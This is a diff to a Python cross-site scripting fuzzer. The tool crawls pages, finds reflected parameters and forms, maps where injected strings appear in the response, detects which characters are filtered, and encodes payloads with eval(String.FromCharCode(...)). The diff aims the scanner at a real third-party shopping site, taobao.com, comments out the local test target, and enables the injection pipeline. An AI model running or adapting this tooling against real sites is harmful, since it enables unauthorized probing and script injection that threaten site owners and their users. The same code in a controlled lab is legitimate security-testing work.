@@ -10,8 +10,10 @@ import re
 import os
 import sys
 
-#url = 'http://127.0.0.1/xss-example/';
-url = 'https://www.taobao.com/';
+#url = 'http://127.0.0.1:8000/xss-example/';
+#allow_domain = '127.0.0.1'
+
+url = 'https://www.taobao.com/'
 allow_domain = 'taobao.com'
 
 keywords = (
@@ -65,7 +67,7 @@ def payload_parse_synax(raw,info):
     isevent = info['isevent']
     isclose = info['isclose']
     SWITCH = r'\((.*?)\)'
-   
+
     OPTION = r'\{(.*?)\}'
 
 
@@ -116,6 +118,8 @@ def get_dynamic_links_url(murl):
                     visited[host] = list()
                 if k in visited[host]:
                     continue
+                else:
+                    visited[host].append(k)
                 if k in ignore:
                     if ignore[k] == 3:
                         print(k,'ignore')
@@ -132,14 +136,12 @@ def get_dynamic_links_url(murl):
                     item['method'] = 'get'
                     item['param'] = k
                     item['raw'] = fuzz
-                    if not item in url_links:
-                        url_links.append(item)
+                    url_links.append(item)
                 else:
                     print(k,'not dynamic')
                     if not k in ignore:
                         ignore[k] = 1
                     ignore[k] += 1
-                visited[host].append(k)
     return url_links
 
 
@@ -185,7 +187,7 @@ def get_dynamic_links_form(murl):
         print('method:',method)
         item = dict()
         item['url'] = url
-        item['method'] = method 
+        item['method'] = method
         count = 1
         data = dict(zip([el['name'] for el in tags],[''.join(random.sample(string.ascii_letters,8)) for _ in tags]))
         if method == 'get':
@@ -208,49 +210,47 @@ def get_output_position(links):
     '''
     Get the output position
     '''
-    plinks = dict()
-    for murl,item in links.items():
-        for method,params in item.items():
-            if not murl in plinks:
-                plinks[murl] = dict()
-            if not method in plinks[murl]:
-                plinks[murl][method] = dict()
-            data = dict(zip(params,[''.join(random.sample(string.ascii_letters,8)) for _ in params]))
-            try:
-                if method == 'get':
-                    response = requests.get(murl,params=data)
+    plinks = list()
+    for item in links:
+        url = item['url']
+        method = item['method']
+        keys = list(item.keys())
+        params = list()
+        israw = False
+        if 'raw' in item:
+            raw = item['raw']
+            israw = True
+        for k in keys:
+            if k.startswith('param'):
+                params.append(item[k])
+        fuzz = dict(zip(params,[''.join(random.sample(string.ascii_letters,8)) for _ in params]))
+        if method == 'get':
+            response = requests.get(url,params=fuzz)
+        else:
+            response = requests.post(url,data=fuzz)
+        for p,r in fuzz.items():
+            regex_rnd = r'.*{0}.*'.format(r)
+            regex_tags = r'\<.*\>.*?{0}.*?\<\/.*\>'.format(r)
+            regex_attrs = r'\<.*\=\".*{0}.*\".*\>'.format(r)
+            position = re.findall(regex_rnd,response.text)
+            if len(p) != 5:
+                n = p.replace('param','')
+                name = 'pos' + str(n)
+            else:
+                name = 'pos'
+            item[name] = list()
+            for pos in position:
+                if re.findall(regex_tags,pos):
+                    item[name].append('tags')
+                    print(p,'output between tags')
+                elif re.findall(regex_attrs,pos):
+                    item[name].append('attrs')
+                    print(p,'output in tags')
                 else:
-                    response = requests.post(murl,data=data)
-            except Exception as e:
-                print(e)
-                continue
-            for k,v in data.items():
-                regex_rnd = r'.*{0}.*'.format(v)
-                regex_tags = r'\<.*\>.*?{0}.*?\<\/.*\>'.format(v)
-                regex_attrs = r'\<.*\=\".*{0}.*\".*\>'.format(v)
-                position = re.findall(regex_rnd,response.text)
-
-                for pos in position:
-                    if re.findall(regex_tags,pos):
-                        if not 'tags' in plinks[murl][method]:
-                            plinks[murl][method]['tags'] = list()
-                        if not k in plinks[murl][method]['tags']:
-                            print(k,'output between tags')
-                            plinks[murl][method]['tags'].append(k)
-                    elif re.findall(regex_attrs,pos):
-                        if not 'attrs' in plinks[murl][method]:
-                            plinks[murl][method]['attrs'] = list()
-                        if not k in plinks[murl][method]['attrs']:
-                            print(k,'output in tags')
-                            plinks[murl][method]['attrs'].append(k)
-                    else:
-                        if not 'page' in plinks[murl][method]:
-                            plinks[murl][method]['page'] = list()
-                        if not k in plinks[murl][method]['page']:
-                            print(k,'output on the page')
-                            plinks[murl][method]['page'].append(k)
+                    item[name].append('page')
+                    print(p,'output on the page')
+        plinks.append(item)
     return plinks
-
 
 def get_xss_filter(links):
     '''
@@ -280,11 +280,15 @@ def get_xss_filter(links):
                 rnd = ''.join(random.sample(string.ascii_letters,8))
                 fuzz[p] = rnd + s + rnd
                 if israw:
-                    merge = dict(fuzz.items() + raw.items())
-                if method == 'get':
-                    response = requests.get(murl,params=merge)
+                    merge = dict()
+                    merge.update(fuzz)
+                    merge.update(raw)
                 else:
-                    response = requests.get(murl,params=merge)
+                    merge = fuzz.copy()
+                if method == 'get':
+                    response = requests.get(url,params=merge)
+                else:
+                    response = requests.get(url,params=merge)
                 keyword = re.findall(r'(?<={0})(.*)?(?={1})'.format(rnd,rnd),response.text)
                 if keyword:
                     for w in keyword:
@@ -298,38 +302,7 @@ def get_xss_filter(links):
                 item['filtered'] = filtered
                 print(p,filtered,'filtered')
         xlinks.append(item)
-    # for murl,mitem in links.items():
-    #     for method,item in mitem.items():
-    #         for pos,params in item.items():
-    #             xlink[murl][method][pos] = dict()
-    #             for p in params:
-    #                 data = dict()
-    #                 allowed = list()
-    #                 for pp in params:
-    #                     if pp != p:
-    #                         data[pp] = ''.join(random.sample(string.ascii_letters,8))
-    #                 for s in symbols:
-    #                     rnd = ''.join(random.sample(string.ascii_letters,8))
-    #                     data[p] = rnd + s + rnd
-    #                     try:
-    #                         if method == 'get':
-    #                             response = requests.get(murl,params=data)
-    #                         else:
-    #                             response = requests.post(murl,data=data)
-    #                     except Exception as e:
-    #                         print(e)
-    #                         continue
-    #                     keyword = re.findall(r'(?<={0})(.*)?(?={1})'.format(rnd,rnd),response.text)
-    #                     if keyword:
-    #                         for k in keyword:
-    #                             if k == s:
-    #                                 allowed.append(s)
-    #                 xlink[murl][method][pos][p] = [a for a in symbols if a not in allowed] 
-    #                 if len(allowed) == len(symbols):
-    #                     print(p,'allowed all symbols')
-    #                 else:
-    #                     print(p,','.join([a for a in symbols if a not in allowed]),'filtered')
-    # return xlink
+    return xlinks
 
 
 def encode_xss_payload(payload,entype):
@@ -356,7 +329,7 @@ def encode_xss_payload(payload,entype):
         for p in payload:
             asc_p.append(str(ord(p)))
         asc_p = 'eval(String.FromCharCode(' + ','.join(asc_p) + '))'
-        return asc_p    
+        return asc_p
 
 
 def automatic_gen_payload(result):
@@ -394,8 +367,8 @@ def inject_xss_payload(links):
 
 
 ulinks = get_dynamic_links_url(url)
-flinks = get_dynamic_links_form(url)
-# plinks1 = get_output_position(ulinks)
-# plinks2 = get_output_position(flinks)
-# xlinks1 = get_xss_filter(plinks1)
-# xlinks2 = get_xss_filter(plinks2)
+#flinks = get_dynamic_links_form(url)
+plinks1 = get_output_position(ulinks)
+#plinks2 = get_output_position(flinks)
+xlinks1 = get_xss_filter(plinks1)
+#xlinks2 = get_xss_filter(plinks2)
